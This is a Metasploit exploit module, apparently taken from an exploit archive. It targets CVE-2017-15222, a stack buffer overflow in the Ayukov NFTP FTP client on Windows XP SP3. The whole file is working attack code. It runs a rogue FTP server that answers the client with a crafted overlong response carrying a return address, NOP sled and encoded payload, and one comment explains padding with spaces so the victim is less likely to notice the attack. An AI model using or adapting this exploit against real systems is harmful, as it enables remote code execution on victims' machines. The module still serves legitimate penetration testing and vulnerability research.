# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::TcpServer
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Ayukov NFTP FTP Client Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack-based buffer overflow vulnerability against Ayukov NFTPD FTP
          Client 2.0 and earlier. By responding with a long string of data for the SYST request, it
          is possible to cause a denail-of-service condition on the FTP client, or arbitrary remote
          code exeuction under the context of the user if successfully exploited.
      },
      &#039;Author&#039;   =>
        [
          &#039;Berk Cem Goksel&#039;,  # Original exploit author
          &#039;Daniel Teixeira&#039;,  # MSF module author
          &#039;sinn3r&#039;            # RCA, improved module reliability and user exp
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2017-15222&#039;],
          [ &#039;EDB&#039;, &#039;43025&#039; ],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00\x01\x0a\x10\x0d",
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
    [ &#039;Windows XP Pro SP3 English&#039;, { &#039;Ret&#039; => 0x77f31d2f } ], # GDI32.dll v5.1.2600.5512
        ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultOptions&#039; =>
        {
      &#039;SRVHOST&#039; => &#039;0.0.0.0&#039;,
        },
      &#039;DisclosureDate&#039; => &#039;Oct 21 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptPort.new(&#039;SRVPORT&#039;, [ true, "The FTP port to listen on", 21 ]),
      ])
  end
 
  def exploit
    srv_ip_for_client = datastore[&#039;SRVHOST&#039;]
    if srv_ip_for_client == &#039;0.0.0.0&#039;
      if datastore[&#039;LHOST&#039;]
        srv_ip_for_client = datastore[&#039;LHOST&#039;]
      else
        srv_ip_for_client = Rex::Socket.source_address(&#039;50.50.50.50&#039;)
      end
    end
 
    srv_port = datastore[&#039;SRVPORT&#039;]
 
    print_status("Please ask your target(s) to connect to #{srv_ip_for_client}:#{srv_port}")
    super
  end
 
  def on_client_connect(client)
    return if ((p = regenerate_payload(client)) == nil)
    print_status("#{client.peerhost} - connected")
 
    # Let the client log in
    client.get_once
 
    print_status("#{client.peerhost} - sending 331 OK")
    user = "331 OK.\r\n"
    client.put(user)
 
    client.get_once
    print_status("#{client.peerhost} - sending 230 OK")
    pass = "230 OK.\r\n"
    client.put(pass)
 
    # It is important to use 0x20 (space) as the first chunk of the buffer, because this chunk
    # is visible from the user&#039;s command prompt, which would make the buffer overflow attack too
    # obvious.
    sploit = "\x20"*4116
 
    sploit << [target.ret].pack(&#039;V&#039;)
    sploit << make_nops(10)
    sploit << payload.encoded
    sploit << Rex::Text.rand_text(15000 - 4116 - 4 - 16 - payload.encoded.length, payload_badchars)
    sploit << "\r\n"
 
    print_status("#{client.peerhost} - sending the malicious response")
    client.put(sploit)
 
    client.get_once
    pwd = "257\r\n"
    client.put(pwd)
    client.get_once
 
  end
end

